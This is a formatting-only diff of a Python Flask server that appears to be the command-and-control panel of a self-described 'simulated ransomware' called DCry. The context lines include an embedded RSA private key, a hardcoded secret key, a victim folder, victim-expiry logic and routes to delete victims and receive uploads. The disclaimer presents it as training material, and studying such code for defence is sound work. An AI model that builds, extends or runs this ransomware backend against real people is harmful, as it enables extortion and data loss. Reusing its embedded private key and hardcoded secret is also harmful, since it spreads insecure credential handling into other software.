@@ -4,8 +4,8 @@
 ################################################################################
 # DISCLAIMER: This is a simulated ransomware (DCry), written for cybersecurity
 # research, ethical hacking education, and malware analysis training only.
-# It mimics behavior of real ransomware but must NOT be used for illegal or 
-# unauthorized activity. Run only in isolated environments (e.g., sandbox or VM) 
+# It mimics behavior of real ransomware but must NOT be used for illegal or
+# unauthorized activity. Run only in isolated environments (e.g., sandbox or VM)
 # under supervision of cybersecurity professionals.
 # The authors assume no liability for any misuse or damage caused.
 
@@ -19,7 +19,15 @@ from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
 from flask_wtf.csrf import CSRFProtect
 from markupsafe import escape as flask_escape
-from flask import Flask, request, render_template_string, redirect, url_for, flash, current_app
+from flask import (
+    Flask,
+    request,
+    render_template_string,
+    redirect,
+    url_for,
+    flash,
+    current_app,
+)
 
 RSA_PRIVATE_KEY = """-----BEGIN RSA PRIVATE KEY-----
 MIIJJwIBAAKCAgEAnCK4qHp0Ie/ClNE4nUaNwa8L36BKek8FoA0+hkUsEFdl/85M
@@ -71,11 +79,11 @@ p/Bmpsy6FRQKOcmgrYSRvowlpRpTiVV5YUXRbs0a7BZyGmWPQNdDyYwS8Jd6Gw7c
 mpmYQieZagWLb9GkxyToV1E28hXNiOfIBkiUMNx6l9jJWidbcQAmpVwd6E44E5ni
 EUIe7NbP2tggohOF6WGpf6wb0AuWVXdXWkRdKa8WXdpH2u/f7Z2Le7NOxV4gRg5p
 JuFhYChYqOk47EbQPBHRLaOlq2fLTsxPDZ3wje0DBsnLZ/2e2pHv2efaIA==
------END RSA PRIVATE KEY-----""" # Replace with your private key if needed
+-----END RSA PRIVATE KEY-----"""  # Replace with your private key if needed
 
 app = Flask(__name__)
 
-app.config['SECRET_KEY'] = 'dcry-ransomware-poc'
+app.config["SECRET_KEY"] = "dcry-ransomware-poc"
 csrf = CSRFProtect(app)
 
 VICTIM_FOLDER = os.path.abspath(os.path.expanduser("~/dcry_victims/"))
@@ -97,6 +105,7 @@ def sanitize_path_component(component):
         return "_"
     return component
 
+
 def is_safe_path(victim_id):
     base_dir = os.path.abspath(VICTIM_FOLDER)
     victim_path = os.path.join(base_dir, victim_id)
@@ -110,8 +119,6 @@ def victim_is_expired(date_str, days_valid=3):
         return datetime.now() > infected_date + timedelta(days=days_valid)
     except Exception:
         return False
-
-
 
 
 @app.route("/delete_victim", methods=["POST"])
@@ -140,7 +147,10 @@ def delete_victim_route():
     if deleted_count > 0:
         flash(f"Successfully deleted {deleted_count} selected item(s).", "success")
     if failed_count > 0:
-        flash(f"Failed to delete {failed_count} item(s). They may be invalid or already removed.", "danger")
+        flash(
+            f"Failed to delete {failed_count} item(s). They may be invalid or already removed.",
+            "danger",
+        )
 
     return redirect(url_for("dashboard"))
 
@@ -156,7 +166,6 @@ def delete_victim(victim_id):
             app.logger.error(f"Error deleting folder {path}: {e}")
             return False
     return False
-        
 
 
 @app.route("/upload", methods=["POST"])
